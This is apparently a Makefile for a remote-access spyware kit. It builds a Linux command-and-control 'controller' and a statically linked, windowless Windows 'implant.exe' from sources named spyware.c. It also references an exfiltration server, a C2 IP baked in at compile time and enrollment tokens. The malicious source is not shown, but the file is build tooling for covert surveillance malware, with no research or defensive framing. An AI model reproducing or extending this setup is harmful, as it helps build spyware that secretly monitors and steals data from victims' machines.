CC      = gcc
CC_WIN  = x86_64-w64-mingw32-gcc
CFLAGS  = -Wall -Wextra -std=c11 -g -O0 -I include
CFLAGS_WIN = -Wall -Wextra -std=c11 -O2 -I include

LINUX_DIR = bin/linux
WIN_DIR   = bin/windows

# Cross-compiled OpenSSL paths.
# OPENSSL_WIN_PREFIX is set by the exfil-server Dockerfile when building the
# Windows implant.  For local builds, set it to wherever you installed it.
OPENSSL_WIN_PREFIX ?= /opt/openssl-win
OPENSSL_WIN_INC     = $(OPENSSL_WIN_PREFIX)/include
OPENSSL_WIN_LIB     = $(shell test -d $(OPENSSL_WIN_PREFIX)/lib64 && \
                              echo $(OPENSSL_WIN_PREFIX)/lib64 || \
                              echo $(OPENSSL_WIN_PREFIX)/lib)

TARGETS = $(LINUX_DIR)/controller $(WIN_DIR)/implant.exe

all: $(TARGETS)

# ── Linux controller (system OpenSSL via libssl-dev) ──────────────────
# protocol.c and tls.c both use OpenSSL, so -lssl -lcrypto are required.
# -ldl is needed for OpenSSL's dynamic loader on Linux.
# -pthread is needed by platform.h (keepalive thread on the implant side,
# and OpenSSL's thread safety internally).
$(LINUX_DIR)/controller: src/controller.c src/protocol.c src/tls.c \
                          src/controller_utils.c src/spyware_controller.c | $(LINUX_DIR)
	$(CC) $(CFLAGS) $^ -o $@ \
	    -lssl -lcrypto -ldl -lpthread

# ── Windows implant (cross-compiled OpenSSL static libs) ──────────────
# implant_certs.h must exist before this target runs.
# It is generated by certs/generate_certs.sh (called from launch.sh) and
# written directly to include/implant_certs.h — no Makefile step needed.
#
# Pass -DC2_DEFAULT_HOST="<ip>" to bake the C2 IP in:
#   make bin/windows/implant.exe C2_HOST_IP=192.168.1.100 ENROLLMENT_TOKEN=<hex>
$(WIN_DIR)/implant.exe: src/implant.c src/protocol.c src/tls.c \
                         src/implant_utils.c src/spyware.c include/implant_certs.h | $(WIN_DIR)
	$(CC_WIN) $(CFLAGS_WIN) \
	    $(if $(C2_HOST_IP),-DC2_DEFAULT_HOST=\"$(C2_HOST_IP)\") \
	    $(if $(ENROLLMENT_TOKEN),-DENROLLMENT_TOKEN=\"$(ENROLLMENT_TOKEN)\") \
	    -I $(OPENSSL_WIN_INC) \
	    src/implant.c src/protocol.c src/tls.c src/implant_utils.c src/spyware.c \
	    -o $@ \
	    -L $(OPENSSL_WIN_LIB) \
	    -lssl -lcrypto -lws2_32 -lcrypt32 -lbcrypt -lgdi32 -luser32 \
	    -mwindows \
	    -static

$(LINUX_DIR):
	mkdir -p $(LINUX_DIR)

$(WIN_DIR):
	mkdir -p $(WIN_DIR)

clean:
	rm -rf bin

.PHONY: all clean
